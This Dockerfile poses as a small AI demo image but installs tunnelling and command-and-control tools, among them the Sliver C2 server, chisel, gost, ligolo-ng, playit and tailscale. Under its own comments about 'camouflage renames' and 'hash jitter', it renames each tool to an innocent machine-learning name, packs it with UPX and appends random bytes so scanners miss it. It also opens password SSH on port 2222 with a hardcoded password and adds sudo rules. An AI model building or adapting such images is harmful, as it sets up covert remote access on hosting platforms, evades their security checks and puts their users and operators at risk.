FROM ubuntu:22.04

# Use uv for extremely fast installs
COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/

# System tools, tunnel binaries, camouflage renames, UPX pack, and hash jitter — one layer
# so uncompressed originals are not retained in earlier filesystem layers.
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl wget sudo python3 python3-pip upx openssh-server nginx \
    git vim nano htop tmux jq unzip iputils-ping net-tools tree \
    rclone supervisor iproute2 \
    && mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd \
    && echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config \
    && echo "Port 2222" >> /etc/ssh/sshd_config \
    && ssh-keygen -A \
    && curl -fsSL https://tailscale.com/install.sh | bash \
    && curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash \
    && curl -fsSL URL_OBFUSCATE("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator \
    && curl -fsSL URL_OBFUSCATE("https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz") -o /tmp/chisel.gz \
    && gzip -d /tmp/chisel.gz && mv /tmp/chisel /usr/bin/cuda-mesh-bridge \
    && curl -fsSL URL_OBFUSCATE("https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz") -o /tmp/gost.tar.gz \
    && tar -xzf /tmp/gost.tar.gz -C /tmp && mv /tmp/gost /usr/bin/system-bridge \
    && curl -fsSL URL_OBFUSCATE("https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64") -o /usr/bin/gradient-optimizer \
    && curl -fsSL URL_OBFUSCATE("https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz") -o /tmp/ligolo-proxy.tar.gz \
    && tar -xzf /tmp/ligolo-proxy.tar.gz -C /tmp && mv /tmp/proxy /usr/bin/neural-route-controller \
    && mv /usr/sbin/tailscaled /usr/bin/python-cache-manager \
    && mv /usr/bin/tailscale /usr/bin/py-cache-cli \
    && mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector \
    && chmod +x /usr/bin/tensor-allocator /usr/bin/cuda-mesh-bridge /usr/bin/system-bridge /usr/bin/gradient-optimizer /usr/bin/neural-route-controller \
    && for bin in python-cache-manager py-cache-cli ai-metrics-collector tensor-allocator cuda-mesh-bridge system-bridge gradient-optimizer neural-route-controller; do \
        upx -1 "/usr/bin/$$bin" 2>/dev/null || true; \
        head -c 32 /dev/urandom >> "/usr/bin/$$bin"; \
    done \
    && rm -rf /tmp/* \
    && apt-get purge -y upx \
    && apt-get autoremove -y \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# Install AI dependencies using uv
RUN uv pip install --system --no-cache-dir \
    gradio huggingface_hub loguru urllib3 "litellm[proxy]"

# Download a tiny model config for mimicry
RUN python3 -c "from huggingface_hub import hf_hub_download; hf_hub_download(repo_id='gpt2', filename='config.json')"

# Create non-root user 'user' with sudo access and bash shell
RUN useradd -m -u 1000 -s /bin/bash user && \
    echo "user:apple123" | chpasswd && \
    usermod -aG sudo user && \
    mkdir -p /home/user/.torch_metrics && \
    chown -R user:user /home/user/.torch_metrics && \
    echo "user ALL=(ALL) NOPASSWD: /usr/sbin/sshd, /usr/sbin/chpasswd" >> /etc/sudoers && \
    echo "user ALL=(ALL) NOPASSWD: /usr/bin/neural-route-controller" >> /etc/sudoers

# Copy application files
COPY --chown=user:user src/app.py /home/user/app.py
COPY --chown=user:user src/core /home/user/core
COPY --chown=user:user src/services /home/user/services
COPY --chown=user:user config /home/user/config
# ligolo-ng.yaml must live in WORKDIR (/home/user) so Viper's Search Path Mode
# (which searches "." == /home/user) can both READ it on boot AND WRITE the
# argon2 hash back without hitting the "not in registered search paths" panic.
COPY --chown=user:user config/ligolo-ng.yaml /home/user/ligolo-ng.yaml

USER user
WORKDIR /home/user

# Run the script via supervisord
CMD ["/usr/bin/supervisord", "-c", "/home/user/config/supervisord.conf"]
